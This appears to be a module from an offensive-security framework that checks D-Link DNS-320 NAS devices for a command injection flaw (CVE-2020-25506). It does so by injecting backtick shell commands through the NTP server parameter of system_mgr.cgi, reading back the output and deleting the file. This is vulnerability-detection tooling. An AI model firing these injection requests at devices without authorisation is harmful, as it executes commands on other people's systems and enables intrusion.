#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DNS-320 system_mgr.cgi NTP command injection (CVE-2020-25506)."""

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'D-Link DNS-320 - system_mgr.cgi RCE Detection (CVE-2020-25506)',
        'description': (
            'Detects CVE-2020-25506 by injecting a command via '
            '/cgi-bin/system_mgr.cgi?cmd=cgi_ntp_time&f_ntp_server=`cmd`, writing output '
            'under /cgi-bin/<token>.txt and reading it back.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2020', 'dlink', 'nas', 'rce', 'cmdi',
            'unauth', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'exploits/linux/http/dlink_cve_2020_25506_rce',
                ],
            },
        },
        'references': [
            'https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10183',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-25506',
        ],
        'cve': 'CVE-2020-25506',
    }

    def run(self):
        name = secrets.token_hex(6) + '.txt'
        inj = (
            f'/cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_ntp_time&'
            f'f_ntp_server=`id%20>%20{name}`'
        )
        self.http_request(method='GET', path=inj, allow_redirects=False)
        r = self.http_request(method='GET', path=f'/cgi-bin/{name}', allow_redirects=False)
        self.http_request(
            method='GET',
            path=(
                f'/cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_ntp_time&'
                f'f_ntp_server=`rm%20{name}`'
            ),
            allow_redirects=False,
        )
        if r and re.search(r'uid=\d+', r.text or ''):
            self.set_info(
                severity='critical',
                reason='D-Link DNS system_mgr.cgi RCE (CVE-2020-25506)',
                path='/cgi-bin/system_mgr.cgi',
            )
            return True
        return False
